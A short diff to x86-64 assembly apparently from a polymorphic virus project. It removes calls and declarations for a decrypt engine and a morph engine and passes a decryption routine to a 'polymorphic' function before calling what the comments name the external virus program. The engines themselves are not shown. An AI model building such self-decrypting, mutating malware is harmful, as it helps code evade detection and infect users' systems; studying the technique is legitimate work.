@@ -2,9 +2,6 @@
 
 extern main
 extern polymorphic
-extern decrypt_engine
-extern decrypt_engine.decryption_function
-extern morph_engine
 ; Define variables in the data section
 section .data
 	hello:     db 'Hello world!',10
@@ -27,8 +24,6 @@ _start:             ; Global entry point
 	mov rdi, main
 	mov rsi, _start
 	sub rsi, main
-	call decrypt_engine
-
 	call work_engine
 
 	; ; reload the initial program, state
@@ -45,7 +40,7 @@ _start:             ; Global entry point
 	mov rdi, main
 	mov rsi, _start
 	sub rsi, main
-	mov rdx, decrypt_engine.decryption_function
+	mov rdx, work_engine.decryption_function
 	call polymorphic
 
 	; ; call the external virus program
